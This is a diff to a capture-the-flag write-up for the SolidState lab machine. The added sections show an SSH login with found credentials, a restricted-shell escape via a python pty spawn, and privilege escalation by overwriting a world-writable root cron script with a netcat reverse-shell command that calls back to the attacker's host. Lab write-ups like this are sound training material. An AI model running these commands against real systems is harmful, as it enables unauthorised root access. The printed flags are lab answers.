@@ -254,7 +254,7 @@ And there are the temporary credentials, let's see if they are still valid on th
 
 ## Gaining Access
 
-Since the web application doens't appear to have a login page at first glance trying Midy's temprary credentials with SSH gets us access to the box and get the first flag (that would have been for Hack The Box):
+Since the web application doens't appear to have a login page at first glance trying Midy's temprary credentials with SSH gets us access to the box (with a limited shell) and get the first flag (that would have been for Hack The Box):
 
 ```
 root@kali:~# ssh mindy@172.16.11.147                                                                                        
@@ -272,7 +272,8 @@ mindy@solidstate:~$ ls
 bin  user.txt
 mindy@solidstate:~$ cat user.txt 
 914d0a4ebc1777889b5b89a23f556fd75
-mindy@solidstate:~$ 
+mindy@solidstate:~$ sudo -l
+-rbash: sudo: command not found
 ```
 
 ```
@@ -280,4 +281,48 @@ mindy@solidstate:~$ cat user.txt
 914d0a4ebc1777889b5b89a23f556fd75
 ```
 
+## Privilege Escalation
 
+Because rbash is a terrible thing and you are very limited as to what can be invoked or ran we have to execute our bash shell when we connect via SSH:
+
+```
+root@kali:~# ssh mindy@172.16.11.147 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"
+mindy@172.16.11.147's password: 
+$ 
+```
+
+Doing basic enumeration for privilage escalation we find this file: `tmp.py'
+
+```
+[+] World Writable Files
+    -rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
+    --w--w--w- 1 root root 0 Nov 28 12:10 /sys/fs/cgroup/memory/cgroup.event_control
+```
+
+```python
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+```
+
+Replacing the contents of `tmp.py` with our own code results in a new root shell: (and the root flag that was for Hack The Box)
+
+```
+$ echo 'import os; os.system("/bin/nc 172.16.11.129 4444 -e /bin/bash")' > /opt/tmp.py
+```
+
+```
+root@kali:~# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [172.16.11.129] from (UNKNOWN) [172.16.11.147] 33738
+id
+uid=0(root) gid=0(root) groups=0(root)
+ls
+root.txt
+cat root.txt
+b4c9723a28899b1c45db281d99cc87c9
+```
